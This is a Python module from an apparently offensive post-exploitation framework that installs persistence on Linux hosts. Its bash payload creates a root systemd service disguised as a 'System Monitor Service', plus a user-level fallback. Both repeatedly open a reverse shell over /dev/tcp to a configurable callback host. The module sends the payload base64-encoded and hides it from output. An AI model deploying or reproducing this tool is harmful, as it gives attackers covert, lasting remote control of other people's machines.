"""Systemd service persistence script."""

from ..base import OperatorScript, ScriptResult


class SystemdService(OperatorScript):
    """Create persistent systemd service."""
    
    name = "Systemd Service"
    description = "Create persistent systemd service"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] SYSTEMD SERVICE PERSISTENCE"
echo "==============================="
echo ""

CALLBACK="${CALLBACK_HOST:-192.168.1.100:4444}"
SERVICE_NAME="systemd-monitor"

echo "[+] Creating systemd service: $SERVICE_NAME"

cat > /etc/systemd/system/$SERVICE_NAME.service 2>/dev/null <<EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/${CALLBACK//:/ } 0>&1; sleep 300; done'
Restart=always
RestartSec=300

[Install]
WantedBy=multi-user.target
EOF

if [ -f /etc/systemd/system/$SERVICE_NAME.service ]; then
    echo "[+] Service file created"
    
    echo "[+] Reloading systemd daemon..."
    systemctl daemon-reload 2>/dev/null
    
    echo "[+] Enabling service..."
    systemctl enable $SERVICE_NAME 2>/dev/null && \
        echo "[+] Service enabled" || \
        echo "[-] Could not enable service"
    
    echo "[+] Starting service..."
    systemctl start $SERVICE_NAME 2>/dev/null && \
        echo "[+] Service started" || \
        echo "[-] Could not start service"
    
    echo ""
    echo "[+] Service status:"
    systemctl status $SERVICE_NAME 2>/dev/null || echo "[-] Could not get status"
else
    echo "[-] Could not create service file (requires root)"
fi

echo ""
echo "[+] Alternative: User systemd service..."
USER_SERVICE_DIR="$HOME/.config/systemd/user"
mkdir -p "$USER_SERVICE_DIR" 2>/dev/null

cat > "$USER_SERVICE_DIR/$SERVICE_NAME.service" 2>/dev/null <<EOF
[Unit]
Description=User Monitor Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${CALLBACK//:/ } 0>&1'
Restart=always
RestartSec=600

[Install]
WantedBy=default.target
EOF

if [ -f "$USER_SERVICE_DIR/$SERVICE_NAME.service" ]; then
    echo "[+] User service created"
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable $SERVICE_NAME 2>/dev/null
    systemctl --user start $SERVICE_NAME 2>/dev/null
    echo "[+] User service status:"
    systemctl --user status $SERVICE_NAME 2>/dev/null
fi

echo ""
echo "[+] Persistence installed!"
echo "    Service: $SERVICE_NAME"
echo "    Callback: $CALLBACK"
echo "    Auto-restart: Yes"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Creating systemd service...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Systemd service creation executed",
                metadata={"script": "systemd_service"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
